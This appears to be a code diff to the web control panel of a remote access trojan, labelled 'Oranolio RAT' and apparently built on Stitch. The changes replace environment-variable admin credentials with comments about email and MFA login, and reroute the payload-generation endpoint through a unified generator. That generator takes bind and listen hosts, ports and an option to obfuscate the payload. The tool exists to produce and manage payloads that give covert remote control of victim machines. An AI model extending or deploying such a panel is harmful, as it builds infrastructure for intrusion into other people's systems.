@@ -30,7 +30,7 @@ from flask_socketio import SocketIO, emit
 from flask_limiter import Limiter
 from flask_limiter.util import get_remote_address
 from flask_wtf.csrf import CSRFProtect
-from werkzeug.security import generate_password_hash, check_password_hash
+# Legacy password hashing removed - using modern email + MFA authentication
 from werkzeug.middleware.proxy_fix import ProxyFix
 
 sys.path.insert(0, os.path.dirname(__file__))
@@ -302,105 +302,12 @@ login_attempts = defaultdict(list)
 connection_health = {}  # Track connection health metrics: {ip: {'last_seen': timestamp, 'connected_at': timestamp}}
 connection_context = {}
 
-# Load credentials from environment variables
-def load_credentials():
-    """
-    Load admin credentials from environment variables.
-    PRODUCTION SECURITY: No default fallback - forces explicit credential configuration.
-    """
-    username = os.getenv('STITCH_ADMIN_USER')
-    password = os.getenv('STITCH_ADMIN_PASSWORD')
-    
-    # In debug mode, provide development defaults for username only
-    if os.getenv('STITCH_DEBUG', '').lower() == 'true':
-        if not username:
-            username = 'admin'
-            # print("⚠️  DEBUG MODE: Using default username 'admin'")
-    
-    # Require explicit credentials - no defaults in production
-    if not username or not password:
-        raise RuntimeError(
-            "\n" + "="*75 + "\n"
-            "🔐 SECURITY ERROR: Missing credentials!\n"
-            "="*75 + "\n"
-            "Authentication credentials must be explicitly configured.\n"
-            "No default credentials allowed for security.\n\n"
-            "Please set environment variables:\n"
-            "  STITCH_ADMIN_USER='your_username'\n"
-            "  STITCH_ADMIN_PASSWORD='your_secure_password'\n\n"
-            "Or for development:\n"
-            "  STITCH_DEBUG=true (enables default credentials)\n\n"
-            "In Replit: Add these to Secrets tab (🔒 icon)\n"
-            "="*75
-        )
-    
-    # Validate password strength
-    if len(password) < 12:
-        raise RuntimeError(
-            "\n" + "="*75 + "\n"
-            "🔐 SECURITY ERROR: Password too short!\n"
-            "="*75 + "\n"
-            f"Your password is {len(password)} characters.\n"
-            "Minimum required: 12 characters\n\n"
-            "Please set a stronger password:\n"
-            "  STITCH_ADMIN_PASSWORD='your_secure_password_12+_chars'\n\n"
-            "In Replit: Update in Secrets tab (🔒 icon)\n"
-            "="*75
-        )
-    
-    # Validate username
-    if len(username) < 3:
-        raise RuntimeError(
-            "\n" + "="*75 + "\n"
-            "🔐 SECURITY ERROR: Username too short!\n"
-            "="*75 + "\n"
-            "Username must be at least 3 characters.\n"
-            "="*75
-        )
-    
-    # print(f"✓ Credentials loaded: {username} ({len(password)} characters)")
-    return {username: generate_password_hash(password)}
+# Legacy authentication system removed - using modern email + MFA authentication only
+# The old STITCH_ADMIN_USER/STITCH_ADMIN_PASSWORD system has been replaced with
+# the more secure email-based authentication with MFA support.
 
-# Initialize users (will be loaded at startup)
-USERS = {}
-
-# Load credentials at module level for WSGI compatibility
-def initialize_credentials():
-    """Initialize credentials at app startup"""
-    global USERS
-    if not USERS:  # Only load if not already loaded
-        try:
-            loaded_creds = load_credentials()
-            USERS.update(loaded_creds)
-            # print("✓ Credentials loaded from environment variables")
-        except RuntimeError as e:
-            pass
-            # Only print full error once
-            if 'SECURITY ERROR' in str(e):
-                pass
-                # print("\n⚠️  Credentials not configured. Set STITCH_ADMIN_USER and STITCH_ADMIN_PASSWORD or use STITCH_DEBUG=true for development.\n")
-            else:
-                pass
-                # print(f"ERROR: {str(e)}")
-            raise
-
-# Initialize credentials when module is imported (WSGI compatibility)
-# Only try once to avoid infinite loops during testing/import
-_credentials_initialized = False
-
-def ensure_credentials_loaded():
-    """Ensure credentials are loaded exactly once"""
-    global _credentials_initialized
-    if not _credentials_initialized:
-        try:
-            initialize_credentials()
-            _credentials_initialized = True
-        except RuntimeError:
-            # Don't fail on import - let main handle this
-            pass
-
-# Try to load credentials on import
-ensure_credentials_loaded()
+# Legacy USERS dictionary removed - no longer needed
+# Authentication is now handled by email_auth.py and mfa_manager.py modules
 
 # ============================================================================
 # Helper Functions
@@ -1321,24 +1228,31 @@ def generate_payload():
         
         # Check if native payload requested
         if data.get('type') == 'native':
-            from native_payload_builder import native_builder
+            from unified_payload_generator import generate_payload
             
             config = {
+                'type': 'native',
                 'platform': data.get('platform', 'linux'),
-                'c2_host': data.get('bind_host', 'localhost'),
-                'c2_port': data.get('bind_port', 4433)
+                'bind_host': data.get('bind_host', 'localhost'),
+                'bind_port': data.get('bind_port', '4433'),
+                'listen_host': data.get('listen_host', 'localhost'),
+                'listen_port': data.get('listen_port', '4455'),
+                'enable_bind': data.get('enable_bind', True),
+                'enable_listen': data.get('enable_listen', True),
+                'payload_name': data.get('payload_name', 'stitch_payload'),
+                'obfuscate': data.get('obfuscate', False)
             }
             
             log_debug(f"Generating native {config['platform']} payload", "INFO", "Payload")
             
-            # Compile native payload
-            result = native_builder.compile_payload(config)
+            # Generate payload using unified system
+            result = generate_payload(config)
             
             if result['success']:
-                session['payload_path'] = result['path']
-                session['payload_filename'] = f"payload_{config['platform']}"
+                session['payload_path'] = result['payload_path']
+                session['payload_filename'] = result['filename']
                 session['payload_type'] = 'native'
-                session['payload_platform'] = config['platform']
+                session['payload_platform'] = result['platform']
                 
                 log_debug(f"Native payload generated: {result['size']} bytes", "INFO", "Payload")
                 
@@ -1348,7 +1262,7 @@ def generate_payload():
                     'payload_size': result['size'],
                     'payload_type': 'native',
                     'platform': result['platform'],
-                    'filename': os.path.basename(result['path']),
+                    'filename': result['filename'],
                     'hash': result['hash'],
                     'config': config,
                     'download_url': '/api/download-payload'
@@ -1357,25 +1271,27 @@ def generate_payload():
                 log_debug(f"Native payload generation failed: {result['error']}", "ERROR", "Payload")
                 return jsonify({'error': result['error']}), 500
         
-        # Import the enhanced payload generator
-        from web_payload_generator import web_payload_gen
+        # Import the unified payload generator
+        from unified_payload_generator import generate_payload
         
         # Get configuration from request
         config = {
+            'type': 'python',  # Use Python payloads for now
+            'platform': data.get('platform', 'linux'),
             'bind_host': data.get('bind_host', ''),
             'bind_port': data.get('bind_port', '4433'),
             'listen_host': data.get('listen_host', 'localhost'),
             'listen_port': data.get('listen_port', '4455'),
             'enable_bind': data.get('enable_bind', True),
             'enable_listen': data.get('enable_listen', True),
-            'platform': data.get('platform', 'linux'),  # Support platform selection
-            'payload_name': data.get('payload_name', 'stitch_payload')
+            'payload_name': data.get('payload_name', 'stitch_payload'),
+            'obfuscate': data.get('obfuscate', False)
         }
         
-        log_debug(f"Generating payload for platform: {config['platform']}", "INFO", "Payload")
+        log_debug(f"Generating {config['type']} payload for platform: {config['platform']}", "INFO", "Payload")
         
-        # Generate payload using enhanced generator
-        result = web_payload_gen.generate_payload(config)
+        # Generate payload using unified generator
+        result = generate_payload(config)
         
         if result['success']:
             pass
@@ -3022,16 +2938,8 @@ if __name__ == '__main__':
     print("🔐 Oranolio RAT - Secure Web Interface")
     print("="*75 + "\n")
     
-    # Ensure credentials are loaded (may already be loaded at module level)
-    try:
-        ensure_credentials_loaded()
-        if not USERS:
-            raise RuntimeError("No users loaded - credentials initialization failed")
-        log_debug("✓ Credentials verified for web interface startup", "INFO", "Security")
-    except RuntimeError as e:
-        pass
-        # print(str(e))
-        sys.exit(1)
+    # Legacy credential system removed - using modern email + MFA authentication
+    log_debug("✓ Modern email + MFA authentication system active", "INFO", "Security")
     
     log_debug("Starting Stitch Web Interface (Real Integration)", "INFO", "System")
     
